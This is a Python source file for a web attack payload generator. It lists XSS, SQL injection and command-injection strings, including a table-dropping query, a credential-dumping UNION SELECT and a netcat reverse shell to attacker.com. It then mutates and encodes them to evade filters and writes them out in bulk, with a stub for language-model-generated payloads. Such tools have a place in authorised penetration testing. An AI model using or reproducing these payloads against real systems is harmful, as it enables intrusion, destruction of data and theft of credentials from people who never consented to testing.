# tools/payload_generator.py

import os
import json
import base64
import urllib.parse
import random

from utils.logger import logger
from utils.output import save_output

# Default static payloads
BASE_PAYLOADS = {
    "XSS": [
        "<script>alert(1)</script>",
        "<img src=x onerror=alert('XSS')>",
        "\"><svg/onload=alert(1)>"
    ],
    "SQLi": [
        "' OR '1'='1",
        "'; DROP TABLE users; --",
        "' UNION SELECT NULL, username, password FROM users --"
    ],
    "RCE": [
        "127.0.0.1; ls -la",
        "`whoami`",
        "& nc -e /bin/bash attacker.com 4444"
    ]
}

# --- Payload Mutation Engine ---
def mutate_payload(payload: str) -> list:
    """Return mutated variants of the payload."""
    return [
        payload.upper(),
        payload.lower(),
        payload[::-1],
        payload.replace(" ", "%20"),
        payload + "--test",
        f"{payload}<!--inject-->",
        payload.replace("alert", "confirm"),
        payload + " #mutation"
    ]

# --- Encoders ---
def encode_variants(payload: str) -> dict:
    """Return encoded versions of the payload."""
    return {
        "base64": base64.b64encode(payload.encode()).decode(),
        "url_encoded": urllib.parse.quote(payload),
        "js_escaped": payload.replace("<", "\\x3c").replace(">", "\\x3e")
    }

# --- AI-Powered Extension (Stub Mode for now) ---
def generate_ai_payloads(prompt: str, category: str) -> list:
    """
    Stub function for AI payloads. In real mode,
    use local LLM or connected API to expand suggestions.
    """
    logger.info(f"[AI] Generating AI payloads for {category} from prompt: {prompt}")
    # Simulated AI responses
    return [
        f"{prompt}_exploit(); // AI Generated",
        f"<script>{prompt}()</script>",
        f"admin'{prompt}'--"
    ]

# --- Save Everything ---
def generate_payloads(save_dir="output/payloads", use_ai=True, prompt="inject"):
    os.makedirs(save_dir, exist_ok=True)
    logger.info(f"[PAYLOAD] Generating advanced payloads in {save_dir}")

    for category, payloads in BASE_PAYLOADS.items():
        all_payloads = []

        for p in payloads:
            variants = [p] + mutate_payload(p)
            all_payloads.extend(variants)

            for variant in variants:
                encoded = encode_variants(variant)
                all_payloads.extend(encoded.values())

        # AI-powered payloads (stub until LLM connected)
        if use_ai:
            ai_payloads = generate_ai_payloads(prompt, category)
            all_payloads.extend(ai_payloads)

        # Deduplicate
        all_payloads = sorted(set(all_payloads))

        # Save
        save_output(save_dir, category.lower(), all_payloads, formats=["json", "txt"])
        logger.success(f"[PAYLOAD] Generated {len(all_payloads)} {category} payloads ✅")


if __name__ == "__main__":
    generate_payloads()
